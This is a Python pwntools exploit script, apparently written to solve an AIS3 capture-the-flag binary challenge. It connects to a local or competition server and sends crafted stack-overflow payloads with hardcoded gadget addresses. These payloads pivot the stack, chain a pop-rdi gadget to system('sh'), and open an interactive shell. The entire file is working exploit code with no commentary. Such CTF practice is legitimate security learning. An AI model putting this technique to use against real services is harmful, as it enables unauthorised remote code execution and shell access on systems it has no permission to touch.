#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 4000)
#r = remote('final.ais3.org', 35171)

pop_rdi_ret = 0x0000000000400623

system = 0x400430

sh = 0x400645

buffer1 = 0x602000-0x100

buffer2 = buffer1+0x20+0xc

read_start = 0x400581

read_judge = 0x40059e

r.send('A'*44 + '\x2c' + '\x00'*3 + p64(buffer1) + p64(read_start))
r.send('A'*44 + '\x2c' + '\x00'*3 + p64(buffer2) + p64(read_start))
raw_input('#')
r.send('\x00'*4 + 'A'*8 + p64(read_judge) + p64(sh) + p64(system) + 'A'*8 + '\x2c' + '\x00'*3 + p64(buffer1) + p64(read_start))
raw_input('@')
r.send('A'*44 + '\x2c' + '\x00'*3 + p64(0xdeadbeef) + p64(pop_rdi_ret))

r.interactive()
